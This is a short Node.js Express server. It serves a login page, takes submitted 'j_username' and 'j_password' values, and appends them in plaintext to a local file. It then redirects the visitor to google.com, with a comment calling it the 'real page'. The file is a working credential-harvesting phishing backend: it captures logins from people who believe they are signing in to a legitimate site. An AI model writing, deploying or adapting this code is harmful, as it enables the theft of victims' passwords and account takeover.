//jshint esversion:6
const express = require("express");
const bodyParser = require("body-parser");
var request = require('request');
var http = require("http");
var path = require('path');

const fs = require("fs");

const app = express();
app.use(bodyParser.urlencoded({extended: true}));

app.get("/", function(req, res){
  res.sendFile(__dirname + "/index.html");
});

app.use(express.static(path.join(__dirname, 'public')));

app.post("/", function(req, res){


  // var num1 = Number(req.body.num1);
  // var num2 = Number(req.body.num2);
   var userName = req.body.j_username;
   var password = req.body.j_password;

  //var result = num1 + num2;

  fs.appendFile('user.txt', 'username ' + userName + ' pass ' + password + "\n", (err) => {
    if (err) throw err;
  });

  //res.send("Thanks for sending that." + result);
  res.redirect('http://google.com');
  //redirect to real page


});



app.listen(3000, function(){
  console.log("server started on port 3000");
});
